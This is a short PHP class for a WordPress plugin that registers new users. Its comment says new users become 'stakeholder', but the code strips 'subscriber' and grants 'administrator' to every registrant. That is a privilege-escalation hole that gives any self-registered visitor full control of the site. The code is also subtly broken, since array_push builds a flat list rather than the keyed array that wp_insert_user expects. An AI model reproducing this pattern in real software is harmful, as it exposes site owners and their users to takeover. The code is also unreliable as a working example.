<?php
/*
 * 
 * New User Registration.
 * Registers new user as 'stakeholder'.
 * 
 */

if ( ! class_exists('ZB_Registration')):

    class ZB_Registration {

        // Properties
        private $user;

        // Methods
        public function __construct($user)
        {

            $this->user = $user;
            $this->register_user($user);

        }

        private function register_user($user) {
            $username = $user['user_login'];
            $firstname = $user['first_name'];
            $lastname = $user['last_name'];
            $password = $user['password'];
            $email = $user['user_email'];

            if (username_exists($username) == null && email_exists($email) == false) {
                
                // Create and fill User data array
                $new_user = [];
                array_push($new_user, "user_pass", $password);
                array_push($new_user, "user_login", $username);
                array_push($new_user, "user_nicename", $firstname . " " . $lastname);
                array_push($new_user, "user_email", $email);
                array_push($new_user, "first_name", $firstname);
                array_push($new_user, "last_name", $lastname);

                // Create the new user
                $user_id = wp_insert_user($new_user);

                // Get current user object
                $user = get_user_by('id', $user_id);

                // Remove role
                $user->remove_role('subscriber');

                // Add role
                $user->add_role('administrator');
            }
        }
    }

endif;